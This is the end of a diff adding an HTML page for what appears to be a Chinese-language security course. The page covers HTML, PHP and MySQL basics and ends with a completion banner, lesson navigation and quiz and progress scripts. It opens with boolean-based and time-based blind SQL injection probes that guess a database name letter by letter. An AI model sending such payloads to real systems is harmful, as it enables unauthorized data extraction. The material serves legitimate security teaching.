+<span class="kw">SELECT</span> * <span class="kw">FROM</span> products <span class="kw">WHERE</span> id=1 
+  AND substr(database(),<span class="nu">1</span>,<span class="nu">1</span>)=<span class="st">'m'</span>;   <span class="cm">-- 返回正常則第1個字母是 m</span>
+
+<span class="cm">-- 時間盲注示例</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> products <span class="kw">WHERE</span> id=1 
+  AND if(substr(database(),<span class="nu">1</span>,<span class="nu">1</span>)=<span class="st">'m'</span>, sleep(<span class="nu">3</span>), <span class="nu">0</span>);
+<span class="cm">-- 若延遲 3 秒則第1個字母是 m</span></pre>
+</div>
+
+<div class="done-banner">
+  <h3>第三階段完成！</h3>
+  <p>恭喜你完成網路安全基礎的學習！你現在已具備：資安法律意識、前端（HTML/JS）分析能力、PHP 代碼審計基礎，以及 MySQL 操作和 SQL 注入前置知識。這些都是進入核心 Stage 4 Web 滲透測試的必備基礎。</p>
+  <div class="btn-row">
+    <a href="stage4.html" class="btn-p">前往第四階段：Web 滲透測試</a>
+    <a href="index.html" class="btn-g">返回課程首頁</a>
+    <a href="stage2.html" class="btn-g">回顧第二階段</a>
+  </div>
+</div>
+
+</div><!-- /cw -->
+
+<!-- ===== LESSON NAV ===== -->
+<div class="lnav">
+  <button class="lb" id="prevb" onclick="prevL()" disabled>&#8592; 上一課</button>
+  <div class="ln-mid">
+    <div class="ln-cnt" id="cnt">1 / 23</div>
+    <div class="ln-sub" id="lsub">資安行業概況與就業方向</div>
+  </div>
+  <button class="lb pr" id="nextb" onclick="nextL()">下一課 &#8594;</button>
+</div>
+
+</main>
+</div><!-- /layout -->
+
+<script>
+const LS = [
+  {id:'l1-1',ch:'CH1',title:'資安行業概況與就業方向',time:'15分鐘',type:'行業入門'},
+  {id:'l1-2',ch:'CH1',title:'網路安全法律法規',time:'12分鐘',type:'法律合規'},
+  {id:'l1-3',ch:'CH1',title:'常見漏洞與風險概覽（OWASP）',time:'15分鐘',type:'漏洞概覽'},
+  {id:'l1-4',ch:'CH1',title:'攻防實驗環境搭建',time:'20分鐘',type:'環境配置'},
+  {id:'l1-5',ch:'CH1',title:'滲透測試專業術語速查',time:'10分鐘',type:'術語學習'},
+  {id:'l1-6',ch:'CH1',title:'CTF、護網行動與漏洞庫',time:'12分鐘',type:'行業資源'},
+  {id:'l2-1',ch:'CH2',title:'為什麼資安工程師要學 HTML？',time:'8分鐘',type:'概念引導'},
+  {id:'l2-2',ch:'CH2',title:'HTML 標籤、元素與表單',time:'18分鐘',type:'前端基礎'},
+  {id:'l2-3',ch:'CH2',title:'JavaScript 基礎語法',time:'18分鐘',type:'前端基礎'},
+  {id:'l2-4',ch:'CH2',title:'流程控制與事件處理',time:'15分鐘',type:'前端進階'},
+  {id:'l3-1',ch:'CH3',title:'PHP 環境搭建與基本語法',time:'20分鐘',type:'PHP 基礎'},
+  {id:'l3-2',ch:'CH3',title:'流程控制與函數',time:'15分鐘',type:'PHP 語法'},
+  {id:'l3-3',ch:'CH3',title:'陣列、正則、文件操作',time:'18分鐘',type:'PHP 進階'},
+  {id:'l3-4',ch:'CH3',title:'文件上傳、會話管理、錯誤處理',time:'20分鐘',type:'Web 安全'},
+  {id:'l3-5',ch:'CH3',title:'PHP 操作 MySQL 資料庫',time:'18分鐘',type:'PHP+DB'},
+  {id:'l3-6',ch:'CH3',title:'危險函數與安全開發規範',time:'20分鐘',type:'代碼審計'},
+  {id:'l4-1',ch:'CH4',title:'資料庫介紹與安裝',time:'12分鐘',type:'資料庫基礎'},
+  {id:'l4-2',ch:'CH4',title:'資料庫與資料表操作',time:'18分鐘',type:'DDL 操作'},
+  {id:'l4-3',ch:'CH4',title:'CRUD 操作與 SELECT 查詢',time:'20分鐘',type:'DML 操作'},
+  {id:'l4-4',ch:'CH4',title:'字元集、索引與帳號權限',time:'15分鐘',type:'資料庫安全'},
+  {id:'l4-5',ch:'CH4',title:'資安視角：SQL 注入前置知識',time:'25分鐘',type:'注入基礎'},
+  {id:'l4-6',ch:'CH4',title:'MSSQL 基礎與差異比較',time:'15分鐘',type:'多種資料庫'},
+  {id:'l4-7',ch:'CH4',title:'MySQL 常用函數速查',time:'15分鐘',type:'技能速查'},
+];
+
+const done = new Set(JSON.parse(localStorage.getItem('s3_done')||'[]'));
+let cur = 0;
+
+function go(id, btn) {
+  document.querySelectorAll('.cb').forEach(b=>b.classList.remove('on'));
+  document.querySelectorAll('.ls-btn').forEach(b=>b.classList.remove('lact'));
+  const block = document.getElementById(id);
+  if(block) block.classList.add('on');
+  if(btn) btn.classList.add('lact');
+  cur = LS.findIndex(l=>l.id===id);
+  syncUI();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function toggleCh(btn, id) {
+  btn.classList.toggle('copen');
+  const list = document.getElementById(id);
+  if(list) list.classList.toggle('lopen');
+}
+
+function prevL() {
+  if(cur>0) findAndGo(LS[cur-1].id);
+}
+function nextL() {
+  done.add(LS[cur].id);
+  localStorage.setItem('s3_done', JSON.stringify([...done]));
+  if(cur<LS.length-1) findAndGo(LS[cur+1].id);
+}
+
+function findAndGo(id) {
+  let btn = null;
+  document.querySelectorAll('.ls-btn').forEach(b => {
+    if(b.getAttribute('onclick') && b.getAttribute('onclick').includes("'"+id+"'")) {
+      btn = b;
+      let p = b.parentElement;
+      if(p && !p.classList.contains('lopen')) {
+        p.classList.add('lopen');
+        const cb = p.previousElementSibling;
+        if(cb) cb.classList.add('copen');
+      }
+    }
+  });
+  go(id, btn);
+}
+
+function syncUI() {
+  const l = LS[cur]; if(!l) return;
+  document.getElementById('crumb').innerHTML = `STAGE 03 &gt; ${l.ch} &gt; <em>${l.title}</em>`;
+  document.getElementById('ltitle').textContent = l.title;
+  document.getElementById('chip1').textContent = l.type;
+  document.getElementById('chip2').textContent = `預計 ${l.time}`;
+  document.getElementById('cnt').textContent = `${cur+1} / ${LS.length}`;
+  document.getElementById('lsub').textContent = l.title;
+  document.getElementById('prevb').disabled = cur===0;
+  document.getElementById('nextb').disabled = cur===LS.length-1;
+  if(cur===LS.length-1) document.getElementById('nextb').textContent = '階段完成';
+  else document.getElementById('nextb').innerHTML = '下一課 &#8594;';
+  const pct = done.size ? Math.round(done.size/LS.length*100) : 0;
+  document.getElementById('pct').textContent = pct+'%';
+  document.getElementById('pf').style.width = pct+'%';
+  // update done dots
+  document.querySelectorAll('.ls-btn').forEach(b => {
+    const oc = b.getAttribute('onclick')||'';
+    const m = oc.match(/'(l\d+-\d+)'/);
+    if(m && done.has(m[1]) && !b.classList.contains('lact')) b.classList.add('ldone');
+  });
+}
+
+function chkQ(el, correct) {
+  const box = el.closest('.quiz');
+  if(box.dataset.answered) return;
+  box.dataset.answered = '1';
+  box.querySelectorAll('.qo').forEach(o=>o.style.pointerEvents='none');
+  el.classList.add(correct ? 'ok' : 'bad');
+  if(!correct) box.querySelectorAll('.qo').forEach(o=>{
+    if(o.getAttribute('onclick')&&o.getAttribute('onclick').includes('true')) o.classList.add('ok');
+  });
+  const exp = box.querySelector('.q-exp');
+  if(exp) exp.classList.add('on');
+}
+
+function cpCode(btn) {
+  const pre = btn.closest('.cblock').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(()=>{
+    btn.textContent='已複製';
+    setTimeout(()=>btn.textContent='複製',2000);
+  });
+}
+
+syncUI();
+</script>
+</body>
+</html>
